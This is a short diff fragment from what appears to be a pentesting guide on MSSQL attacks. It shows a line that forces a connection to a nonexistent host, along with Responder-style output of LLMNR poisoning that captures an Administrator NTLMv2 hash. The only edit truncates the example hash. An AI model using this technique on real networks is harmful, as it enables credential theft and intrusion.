@@ -433,7 +433,7 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 [*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
 [MSSQL] NTLMv2 Client   : 10.1.2.3
 [MSSQL] NTLMv2 Username : TEST\Administrator
-[MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788:(etc...)
+[MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788...
 ```
 
 ### DML, DDL and Logon Triggers
